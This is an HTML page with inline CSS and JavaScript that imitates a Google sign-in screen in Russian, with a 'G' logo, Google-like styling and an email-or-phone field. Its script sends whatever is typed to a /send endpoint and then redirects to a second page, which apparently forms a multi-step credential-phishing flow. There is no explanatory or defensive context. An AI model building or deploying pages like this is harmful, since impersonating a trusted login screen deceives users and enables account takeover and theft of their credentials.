<!DOCTYPE html>
<html>
<head>
    <title>Chat</title>

    <style>
        body {
            margin: 0;
            height: 100vh;
            background: #202124;
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }

        .main {
            width: 900px;
            height: 500px;
            display: flex;
            padding: 40px;
        }

        .left {
            flex: 1;
        }

        .logo {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .title {
            font-size: 32px;
        }

        .subtitle {
            color: #9aa0a6;
        }

        .right {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        input {
            width: 100%;
            padding: 16px;
            border: 1px solid #5f6368;
            border-radius: 6px;
            background: transparent;
            color: white;
            font-size: 16px;
            outline: none;
        }

        input:focus {
            border: 2px solid #8ab4f8;
        }

        .bottom {
            margin-top: 30px;
            display: flex;
            justify-content: flex-end;
        }

        button {
            background: #8ab4f8;
            border: none;
            padding: 10px 25px;
            border-radius: 20px;
            cursor: pointer;
        }
    </style>

</head>
<body>

<div class="main">

    <div class="left">
        <div class="logo">G</div>
        <div class="title">Вход</div>
        <div class="subtitle">Введите email</div>
    </div>

    <div class="right">
        <input id="msg" placeholder="Телефон или эл. почта." autocomplete="on">

        <div class="bottom">
            <button onclick="send()">Далее</button>
        </div>
    </div>

</div>

<script>
window.onload = () => {
    document.getElementById("msg").focus();
};

function send() {
    const message = document.getElementById("msg").value;

    if (!message) {
        alert("Email yoz!");
        return;
    }

    fetch("/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message })
    })
    .then(() => {
        window.location.href = "/page2.html";
    });
}
</script>

</body>
</html>
